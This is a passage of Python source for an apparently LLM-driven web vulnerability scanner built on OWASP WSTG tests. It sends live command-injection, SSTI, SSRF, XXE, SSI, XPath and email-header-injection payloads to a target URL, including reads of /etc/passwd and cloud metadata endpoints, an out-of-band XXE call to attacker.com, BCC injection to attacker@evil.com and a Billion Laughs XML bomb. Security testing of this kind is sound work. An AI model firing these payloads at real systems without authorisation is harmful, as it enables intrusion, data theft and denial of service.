                "message": commix_report.get("message", "commix execution failed"),
                "data": {"commix": commix_report}
            }

        findings = commix_report.get("findings", [])
        vulnerable = bool(findings)
        message = f"commix confirmed {len(findings)} command injection vulnerability" if vulnerable else "commix did not identify command injection"

        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings,
                "message": message,
                "commix": commix_report,
                "source": "commix"
            }
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def _test_command_injection_manual_backup(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    BACKUP: Manual command injection testing (only used if commix fails)
    Kept as fallback for edge cases.
    """
    try:
        payloads = [
            # Time-based detection
            "; sleep 5 #",
            "| sleep 5 #",
            "& ping -n 5 127.0.0.1 &",
            "| ping -c 5 127.0.0.1 |",
            # Output-based detection
            "; whoami #",
            "| whoami",
            "& whoami &",
            "`whoami`",
            "$(whoami)",
            # Newline injection
            "%0a whoami",
            "%0d%0a whoami",
            # Logic operators
            "|| whoami",
            "&& whoami",
            # Backtick substitution
            "`id`",
            "$(id)",
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and not param:
            return {"status": "success", "data": {"vulnerable": False, "message": "No parameters to test"}}
        
        findings = []
        test_params = [param] if param else list(params.keys())
        
        async with httpx.AsyncClient(timeout=45, follow_redirects=True) as client:
            for param_name in test_params:
                for payload in payloads:
                    # Build test URL
                    test_params_dict = params.copy()
                    test_params_dict[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict, doseq=True)}"
                    
                    start_time = time.time()
                    try:
                        cmd_resp = await client.get(test_url, timeout=35)
                        elapsed = time.time() - start_time
                        
                        # Time-based detection (sleep payloads)
                        if "sleep" in payload or "ping" in payload:
                            if elapsed > 4.5:  # Expected ~5 seconds
                                findings.append({
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": f"Response delayed by {elapsed:.1f} seconds",
                                    "severity": "critical",
                                    "type": "time_based_command_injection"
                                })
                        
                        # Output-based detection
                        output_patterns = [
                            r"uid=\d+",  # whoami/id output
                            r"gid=\d+",
                            r"groups=",
                            r"root:",
                            r"www-data",
                            r"C:\\Windows",
                            r"C:\\Users",
                        ]
                        
                        for pattern in output_patterns:
                            if re.search(pattern, cmd_resp.text):
                                findings.append({
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": f"Command output detected: {pattern}",
                                    "severity": "critical",
                                    "type": "output_based_command_injection"
                                })
                                break
                    
                    except asyncio.TimeoutError:
                        # Timeout might indicate successful sleep command
                        if "sleep" in payload or "ping" in payload:
                            findings.append({
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": "Request timed out (possible command execution)",
                                "severity": "high",
                                "type": "timeout_based_detection"
                            })
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} command injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No command injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.17 - HOST HEADER INJECTION
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_host_header_injection(url: str) -> Dict[str, Any]:
    """
    WSTG-INPV-17: Test for Host Header Injection
    
    Tests if Host header can be manipulated to:
    - Password reset poisoning
    - Web cache poisoning  
    - Access control bypass
    
    Reference: https://portswigger.net/web-security/host-header
    """
    try:
        parsed = urlparse(url)
        original_host = parsed.netloc
        
        findings = []
        
        # Host header injection payloads
        test_hosts = [
            "evil.com",
            "127.0.0.1",
            "localhost",
            f"evil.com:{parsed.port}" if parsed.port else "evil.com",
            original_host + ".evil.com",
            "evil.com." + original_host,
        ]
        
        async with httpx.AsyncClient(timeout=30, follow_redirects=False) as client:
            # Get baseline response
            baseline_resp = await client.get(url)
            
            for test_host in test_hosts:
                try:
                    # Test with modified Host header
                    headers = {"Host": test_host}
                    resp = await client.get(url, headers=headers)
                    
                    # Check if injected host appears in response
                    if test_host in resp.text:
                        # Further validation - check specific contexts
                        contexts = []
                        if f"http://{test_host}" in resp.text or f"https://{test_host}" in resp.text:
                            contexts.append("absolute_url")
                        if f"href=" in resp.text and test_host in resp.text:
                            contexts.append("href_attribute")
                        if f"Location:" in str(resp.headers) and test_host in str(resp.headers.get("Location", "")):
                            contexts.append("location_header")
                        
                        if contexts:
                            findings.append({
                                "injected_host": test_host,
                                "contexts": contexts,
                                "evidence": f"Injected Host header reflected in {', '.join(contexts)}",
                                "severity": "high" if "location_header" in contexts else "medium",
                                "impact": "Potential for password reset poisoning, cache poisoning, or SSRF"
                            })
                
                except Exception:
                    continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} Host header injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No Host header injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.18 - SERVER-SIDE TEMPLATE INJECTION (ENHANCED)
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_ssti_comprehensive(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-18: Comprehensive Server-Side Template Injection Testing

    Uses tplmap automated tool for comprehensive SSTI testing across all template engines.
    LLM analyzes reconnaissance to determine which parameters to test.

    Reference: https://portswigger.net/research/server-side-template-injection
    """
    try:
        # Use automated tplmap tool instead of manual payloads
        tplmap_report = await run_tplmap_scan(url, param)

        if tplmap_report.get("status") == "error":
            return {
                "status": "error",
                "message": tplmap_report.get("message", "tplmap execution failed"),
                "data": {"tplmap": tplmap_report}
            }

        findings = tplmap_report.get("findings", [])
        vulnerable = bool(findings)
        message = f"tplmap confirmed {len(findings)} SSTI vulnerability" if vulnerable else "tplmap did not identify SSTI"

        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings,
                "message": message,
                "tplmap": tplmap_report,
                "source": "tplmap"
            }
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def _test_ssti_manual_backup(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    BACKUP: Manual SSTI testing (only used if tplmap fails)
    Kept as fallback for edge cases.
    """
    try:
        payloads = [
            # Jinja2 (Python)
            {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2"},
            {"payload": "{{config.items()}}", "expected": "dict_items", "engine": "Jinja2"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "expected": "subprocess", "engine": "Jinja2"},
            
            # Twig (PHP)
            {"payload": "{{7*7}}", "expected": "49", "engine": "Twig"},
            {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "expected": "", "engine": "Twig"},
            
            # FreeMarker (Java)
            {"payload": "${7*7}", "expected": "49", "engine": "FreeMarker"},
            {"payload": "${''.getClass().forName('java.lang.Runtime')}", "expected": "java.lang.Runtime", "engine": "FreeMarker"},
            
            # Smarty (PHP)
            {"payload": "{$smarty.version}", "expected": "Smarty-", "engine": "Smarty"},
            {"payload": "{php}echo `id`;{/php}", "expected": "uid=", "engine": "Smarty"},
            
            # Velocity (Java)
            {"payload": "#set($x=7*7)$x", "expected": "49", "engine": "Velocity"},
            
            # ERB (Ruby)
            {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB"},
            {"payload": "<%= `whoami` %>", "expected": "root", "engine": "ERB"},
            
            # Handlebars (JS)
            {"payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}", "expected": "", "engine": "Handlebars"},
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and not param:
            return {"status": "success", "data": {"vulnerable": False, "message": "No parameters to test"}}
        
        findings = []
        test_params = [param] if param else list(params.keys())
        
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
            for param_name in test_params:
                for test_case in payloads:
                    payload = test_case["payload"]
                    expected = test_case["expected"]
                    engine = test_case["engine"]
                    
                    # Build test URL
                    test_params_dict = params.copy()
                    test_params_dict[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict, doseq=True)}"
                    
                    try:
                        ssti_resp = await client.get(test_url)
                        
                        # Check if expected output appears
                        if expected and expected in ssti_resp.text:
                            findings.append({
                                "parameter": param_name,
                                "payload": payload,
                                "template_engine": engine,
                                "evidence": f"Expected output '{expected}' found in response",
                                "severity": "critical",
                                "impact": "Remote Code Execution via SSTI"
                            })
                            break  # Found vulnerable parameter
                    
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} SSTI vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No SSTI vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.19 - SERVER-SIDE REQUEST FORGERY (ENHANCED)
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_ssrf_comprehensive(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-19: Comprehensive Server-Side Request Forgery Testing

    Uses SSRFmap automated tool for comprehensive SSRF testing.
    LLM analyzes reconnaissance to determine which parameters to test.

    Reference: https://portswigger.net/web-security/ssrf
    """
    try:
        # Use automated SSRFmap tool instead of manual payloads
        ssrfmap_report = await run_ssrfmap_scan(url, param)

        if ssrfmap_report.get("status") == "error":
            return {
                "status": "error",
                "message": ssrfmap_report.get("message", "SSRFmap execution failed"),
                "data": {"ssrfmap": ssrfmap_report}
            }

        findings = ssrfmap_report.get("findings", [])
        vulnerable = bool(findings)
        message = f"SSRFmap confirmed {len(findings)} SSRF vulnerability" if vulnerable else "SSRFmap did not identify SSRF"

        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings,
                "message": message,
                "ssrfmap": ssrfmap_report,
                "source": "ssrfmap"
            }
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def _test_ssrf_manual_backup(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    BACKUP: Manual SSRF testing (only used if SSRFmap fails)
    Kept as fallback for edge cases.
    """
    try:
        test_targets = [
            # Localhost variations
            {"url": "http://127.0.0.1/", "type": "localhost", "evidence_pattern": r"(Apache|nginx|IIS|tomcat)"},
            {"url": "http://localhost/", "type": "localhost", "evidence_pattern": r"(Apache|nginx|IIS)"},
            {"url": "http://[::1]/", "type": "localhost_ipv6", "evidence_pattern": r"(Apache|nginx)"},
            {"url": "http://127.1/", "type": "localhost_short", "evidence_pattern": r""},
            
            # Cloud metadata endpoints
            {"url": "http://169.254.169.254/latest/meta-data/", "type": "aws_metadata", "evidence_pattern": r"(ami-id|instance-id|iam)"},
            {"url": "http://169.254.169.254/metadata/v1/", "type": "digitalocean_metadata", "evidence_pattern": r"(droplet|region)"},
            {"url": "http://metadata.google.internal/computeMetadata/v1/", "type": "gcp_metadata", "evidence_pattern": r"(instance|project)"},
            
            # File protocol
            {"url": "file:///etc/passwd", "type": "file_protocol", "evidence_pattern": r"root:.*:0:0:"},
            {"url": "file:///c:/windows/win.ini", "type": "file_protocol_windows", "evidence_pattern": r"\[fonts\]"},
            
            # Internal networks
            {"url": "http://192.168.1.1/", "type": "internal_network", "evidence_pattern": r"(router|admin|login)"},
            {"url": "http://10.0.0.1/", "type": "internal_network", "evidence_pattern": r""},
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and not param:
            return {"status": "success", "data": {"vulnerable": False, "message": "No parameters to test"}}
        
        findings = []
        test_params = [param] if param else list(params.keys())
        
        async with httpx.AsyncClient(timeout=30, follow_redirects=False) as client:
            for param_name in test_params:
                for target in test_targets:
                    target_url = target["url"]
                    ssrf_type = target["type"]
                    evidence_pattern = target["evidence_pattern"]
                    
                    # Build test URL
                    test_params_dict = params.copy()
                    test_params_dict[param_name] = [target_url]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict, doseq=True)}"
                    
                    try:
                        start_time = time.time()
                        ssrf_resp = await client.get(test_url, timeout=15)
                        elapsed = time.time() - start_time
                        
                        # Check for evidence of SSRF
                        vulnerable = False
                        evidence = []
                        
                        # Pattern matching
                        if evidence_pattern and re.search(evidence_pattern, ssrf_resp.text, re.IGNORECASE):
                            vulnerable = True
                            evidence.append(f"Pattern match: {evidence_pattern}")
                        
                        # Response characteristics
                        if "metadata" in target_url and len(ssrf_resp.text) > 50:
                            vulnerable = True
                            evidence.append("Metadata endpoint returned content")
                        
                        if "/etc/passwd" in target_url and "root:" in ssrf_resp.text:
                            vulnerable = True
                            evidence.append("File system access confirmed")
                        
                        # Time-based detection (internal network might respond faster)
                        if "192.168" in target_url or "10.0" in target_url:
                            if elapsed < 1 and len(ssrf_resp.text) > 0:
                                vulnerable = True
                                evidence.append(f"Fast response from internal IP ({elapsed:.2f}s)")
                        
                        if vulnerable:
                            severity = "critical" if ssrf_type in ["aws_metadata", "file_protocol"] else "high"
                            findings.append({
                                "parameter": param_name,
                                "target": target_url,
                                "type": ssrf_type,
                                "evidence": "; ".join(evidence),
                                "severity": severity,
                                "impact": "Server-Side Request Forgery - can access internal resources"
                            })
                    
                    except asyncio.TimeoutError:
                        # Timeout on internal network might still indicate vulnerability
                        if "192.168" in target_url or "10.0" in target_url:
                            findings.append({
                                "parameter": param_name,
                                "target": target_url,
                                "type": ssrf_type,
                                "evidence": "Request reached internal network (timeout)",
                                "severity": "medium",
                                "note": "Timeout suggests request was processed but target didn't respond"
                            })
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} SSRF vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No SSRF vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.7 - XML INJECTION / XXE TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_xml_injection(
    url: str,
    param: Optional[str] = None,
    xml_endpoint: Optional[str] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-07: Test for XML Injection and XXE (XML External Entity)
    
    Tests for:
    - XML External Entity (XXE) attacks
    - XML bomb (Billion Laughs attack)
    - XPath injection via XML
    
    Reference: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    """
    try:
        logger.info(f"🔍 Starting XXE testing for: {url}")
        findings = []
        
        # XXE payloads targeting different disclosure vectors
        xxe_payloads = [
            # File disclosure
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'file_disclosure'),
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', 'file_disclosure_win'),
            
            # AWS metadata
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'aws_metadata'),
            
            # Blind XXE (OOB)
            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]><foo>test</foo>', 'blind_xxe'),
            
            # XML bomb (Billion Laughs)
            ('''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>''', 'xml_bomb'),
            
            # XPath injection via XML
            ('<user><username>\' or \'1\'=\'1</username><password>anything</password></user>', 'xpath_injection'),
        ]
        
        detection_patterns = [
            (r'root:x:0:0:', 'Linux /etc/passwd disclosure', 'CRITICAL'),
            (r'\[extensions\]', 'Windows win.ini disclosure', 'CRITICAL'),
            (r'ami-id|instance-id|public-ipv4', 'AWS metadata disclosure', 'CRITICAL'),
            (r'<!ENTITY', 'XXE entity processing enabled', 'HIGH'),
            (r'Connection timed out|took too long', 'Possible XML bomb', 'MEDIUM'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(30.0)) as client:
            test_url = xml_endpoint if xml_endpoint else url
            logger.info(f"  Testing XML endpoint: {test_url}")
            
            for idx, (payload, attack_type) in enumerate(xxe_payloads, 1):
                try:
                    logger.info(f"  [{idx}/{len(xxe_payloads)}] Testing attack type: {attack_type}")
                    
                    # Test as POST body
                    headers = {'Content-Type': 'application/xml'}
                    start_time = time.time()
                    
                    logger.debug(f"    Sending XML payload ({len(payload)} bytes)...")
                    response = await client.post(test_url, content=payload, headers=headers)
                    elapsed = time.time() - start_time
                    
                    logger.info(f"    Response: {response.status_code} | Size: {len(response.content)} bytes | Time: {elapsed:.2f}s")
                    
                    # Check for file disclosure
                    for pattern, description, severity in detection_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            logger.warning(f"    ⚠️  VULNERABLE! Detected: {description}")
                            logger.warning(f"        Pattern matched: {pattern}")
                            logger.warning(f"        Evidence preview: {response.text[:200]}...")
                            findings.append({
                                "type": "XXE",
                                "attack_type": attack_type,
                                "payload": payload[:100],
                                "evidence": response.text[:500],
                                "severity": severity,
                                "description": description,
                                "endpoint": test_url,
                                "response_size": len(response.content),
                                "response_time": f"{elapsed:.2f}s"
                            })
                            break
                    
                    # Check for timing anomaly and large response (XML bomb)
                    if attack_type == 'xml_bomb':
                        response_size = len(response.content)
                        logger.info(f"    XML Bomb test - Response size: {response_size} bytes, Time: {elapsed:.2f}s")
                        
                        # If response is abnormally large (> 200 KB), it's likely vulnerable
                        if response_size > 200000:  # 200 KB
                            logger.critical(f"    🚨 XXE VULNERABILITY FOUND!")
                            logger.critical(f"       Attack type: Billion Laughs (XML Bomb)")
                            logger.critical(f"       Endpoint: {test_url}")
                            logger.critical(f"       Response size: {response_size} bytes ({response_size/1024:.1f} KB)")
                            logger.critical(f"       Expected size: < 5 KB")
                            logger.critical(f"       Verdict: Server expanded XML entities → VULNERABLE")
                            
                            findings.append({
                                "type": "XXE_DOS",
                                "attack_type": "xml_bomb",
                                "payload": "Billion laughs attack",
                                "evidence": f"Response size: {response_size} bytes (possible DoS)",
                                "severity": "high",
                                "description": "Server vulnerable to XML bomb (Billion Laughs attack)",
                                "endpoint": test_url,
                                "response_size": response_size,
                                "response_time": f"{elapsed:.2f}s",
                                "impact": "Denial of Service (DoS) - can crash server via memory exhaustion"
                            })
                        elif elapsed > 10:
                            logger.warning(f"    ⚠️  Slow response detected (possible XXE processing)")
                            findings.append({
                                "type": "XXE_TIMING",
                                "attack_type": attack_type,
                                "evidence": f"Response took {elapsed:.2f} seconds",
                                "severity": "MEDIUM",
                                "description": "Server vulnerable to XML bomb (DoS)",
                                "endpoint": test_url
                            })
                        else:
                            logger.info(f"    ✓ XML Bomb test: No vulnerability detected (normal response)")
                    
                    # Test in URL parameter if provided
                    if param:
                        param_url = f"{url}?{param}={quote(payload)}"
                        logger.debug(f"    Testing XML in URL parameter: {param}")
                        response2 = await client.get(param_url)
                        
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response2.text, re.IGNORECASE):
                                logger.warning(f"    ⚠️  XXE via URL parameter: {description}")
                                findings.append({
                                    "type": "XXE_via_parameter",
                                    "parameter": param,
                                    "payload": payload[:100],
                                    "evidence": response2.text[:500],
                                    "severity": severity,
                                })
                                break
                
                except httpx.TimeoutException:
                    if attack_type == 'xml_bomb':
                        findings.append({
                            "type": "XML_BOMB",
                            "severity": "MEDIUM",
                            "description": "Timeout indicates possible XML bomb vulnerability"
                        })
                except Exception:
                    continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} XML injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No XML injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.8 - SSI INJECTION TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_ssi_injection(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-08: Test for Server-Side Includes (SSI) Injection
    
    Tests if SSI directives are executed when reflected in HTML.
    Common in legacy web servers (Apache, IIS) with .shtml pages.
    
    Reference: https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
    """
    try:
        findings = []
        
        # SSI payloads
        ssi_payloads = [
            ('<!--#exec cmd="id" -->', 'command_execution'),
            ('<!--#exec cmd="whoami" -->', 'command_execution'),
            ('<!--#exec cmd="cat /etc/passwd" -->', 'file_disclosure'),
            ('<!--#include virtual="/etc/passwd" -->', 'file_inclusion'),
            ('<!--#echo var="DATE_LOCAL" -->', 'variable_echo'),
            ('<!--#printenv -->', 'env_disclosure'),
        ]
        
        detection_patterns = [
            (r'uid=\d+\(', 'Command execution confirmed (id output)', 'CRITICAL'),
            (r'root:x:0:0:', 'File disclosure (/etc/passwd)', 'CRITICAL'),
            (r'(Mon|Tue|Wed|Thu|Fri|Sat|Sun).+(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)', 'SSI DATE_LOCAL executed', 'HIGH'),
            (r'SERVER_NAME=|HTTP_HOST=', 'Environment variable disclosure', 'HIGH'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as client:
            # Discover parameters if not provided
            test_params = []
            if param:
                test_params = [param]
            else:
                # Try common parameter names
                try:
                    resp = await client.get(url)
                    found_params = re.findall(r'name=["\']([^"\']+)["\']', resp.text)
                    test_params = list(set(found_params))[:5]
                except Exception:
                    test_params = ['q', 'search', 'id', 'page', 'name']
            
            for param_name in test_params:
                for payload, attack_type in ssi_payloads:
                    try:
                        # Test GET
                        test_url = f"{url}?{param_name}={quote(payload)}"
                        response = await client.get(test_url)
                        
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text):
                                findings.append({
                                    "type": "SSI_INJECTION",
                                    "parameter": param_name,
                                    "attack_type": attack_type,
                                    "payload": payload,
                                    "evidence": response.text[:300],
                                    "severity": severity,
                                    "description": description,
                                })
                                break
                        
                        # Test POST
                        response = await client.post(url, data={param_name: payload})
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text):
                                findings.append({
                                    "type": "SSI_INJECTION_POST",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": response.text[:300],
                                    "severity": severity,
                                })
                                break
                    
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} SSI injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No SSI injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.9 - XPATH INJECTION TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_xpath_injection(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-09: Test for XPath Injection
    
    Tests if XPath queries can be manipulated via user input.
    Targets XML-based authentication systems and data retrieval.
    
    Reference: https://owasp.org/www-community/attacks/XPATH_Injection
    """
    try:
        findings = []
        
        # XPath injection payloads
        xpath_payloads = [
            ("' or '1'='1", "boolean_bypass"),
            ("' or 1=1 or ''='", "boolean_bypass"),
            ("admin' or '1'='1' --", "bypass_with_comment"),
            ("') or ('1'='1", "parenthesis_bypass"),
            ("' or count(//*)>0 or ''='", "count_function"),
            ("' and substring(//user[position()=1]/password,1,1)='a", "blind_extraction"),
            ("1/0", "error_based"),
        ]
        
        detection_patterns = [
            (r'xpath|XPath|syntax error', 'XPath error message', 'HIGH'),
            (r'XMLDocument|SimpleXMLElement', 'XML processing error', 'MEDIUM'),
            (r'libxml|Expat|MSXML', 'XML parser error disclosure', 'MEDIUM'),
            (r'(admin|root|user).*logged in', 'Authentication bypass via XPath', 'CRITICAL'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as client:
            # Discover parameters
            test_params = []
            if param:
                test_params = [param]
            else:
                # Common parameters for XPath
                test_params = ['username', 'user', 'login', 'search', 'query', 'id']
            
            for param_name in test_params:
                baseline_response = None
                try:
                    # Get baseline
                    baseline_url = f"{url}?{param_name}=normalvalue"
                    baseline_response = await client.get(baseline_url)
                    baseline_length = len(baseline_response.text)
                except Exception:
                    baseline_length = 0
                
                for payload, attack_type in xpath_payloads:
                    try:
                        # Test GET
                        test_url = f"{url}?{param_name}={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for error messages
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                findings.append({
                                    "type": "XPATH_INJECTION",
                                    "parameter": param_name,
                                    "attack_type": attack_type,
                                    "payload": payload,
                                    "evidence": response.text[:400],
                                    "severity": severity,
                                    "description": description,
                                })
                                break
                        
                        # Check for response length difference (blind XPath)
                        if baseline_response:
                            response_diff = abs(len(response.text) - baseline_length)
                            if response_diff > 100 and attack_type in ['boolean_bypass', 'parenthesis_bypass']:
                                findings.append({
                                    "type": "BLIND_XPATH_INJECTION",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": f"Response length changed by {response_diff} bytes",
                                    "severity": "HIGH",
                                })
                    
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} XPath injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No XPath injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.10 - IMAP/SMTP INJECTION TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_email_injection(
    url: str,
    email_field: Optional[str] = None,
    contact_form: Optional[str] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-10: Test for IMAP/SMTP Injection
    
    Tests for email header injection allowing:
    - Adding BCC recipients
    - Modifying Subject
    - Injecting additional headers
    
    Reference: https://owasp.org/www-community/vulnerabilities/IMAP_SMTP_Injection
    """
    try:
        findings = []
        
        # Email injection payloads
        injection_payloads = [
            # BCC injection
            ('victim@example.com%0aBCC:attacker@evil.com', 'bcc_injection'),
            ('victim@example.com%0dBCC:attacker@evil.com', 'bcc_injection_cr'),
            ('victim@example.com\nBCC:attacker@evil.com', 'bcc_injection_newline'),
            
            # Multiple header injection
            ('victim@example.com%0aSubject:Spam%0aBCC:attacker@evil.com', 'multi_header'),
            
            # CRLF injection
            ('victim@example.com\r\nBCC:attacker@evil.com\r\n', 'crlf_injection'),
            
            # CC injection
            ('victim@example.com%0aCC:attacker@evil.com', 'cc_injection'),
            
            # From header override
            ('victim@example.com%0aFrom:admin@target.com', 'from_override'),
        ]
        
        detection_patterns = [
            (r'Mail sent|Message delivered|sent successfully', 'Email sent (possible injection)', 'HIGH'),
            (r'Invalid email|Email validation failed', 'Validation detected newlines', 'INFO'),
            (r'BCC|CC|Subject.*injection', 'Header injection error message', 'MEDIUM'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as client:
            # Discover email fields
            email_fields = []
            if email_field:
                email_fields = [email_field]
            else:
                try:
                    resp = await client.get(contact_form or url)
                    # Find email input fields
                    found = re.findall(r'name=["\']([^"\']*(?:email|to|recipient|from)[^"\']*)["\']', resp.text, re.IGNORECASE)
                    email_fields = list(set(found))[:3]
                except Exception:
                    email_fields = ['email', 'to', 'from', 'recipient']
            
            for field_name in email_fields:
                for payload, attack_type in injection_payloads:
                    try:
                        # Test POST (most common for contact forms)
                        form_data = {
                            field_name: payload,
                            'subject': 'Test message',
                            'message': 'This is a test',
                            'name': 'Tester'
                        }
                        
                        response = await client.post(contact_form or url, data=form_data)
                        
                        # Check for successful injection indicators
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                # Check if validation rejected it
                                if 'Invalid' not in response.text:
                                    findings.append({
                                        "type": "EMAIL_INJECTION",
                                        "field": field_name,
                                        "attack_type": attack_type,
                                        "payload": payload,
                                        "evidence": response.text[:300],
                                        "severity": severity,
                                        "description": description,
                                    })
                                    break
                        
                        # Check response for error messages that indicate parsing
                        if any(keyword in response.text.lower() for keyword in ['bcc', 'header', 'newline', 'carriage return']):
                            findings.append({
                                "type": "EMAIL_INJECTION_DETECTED",
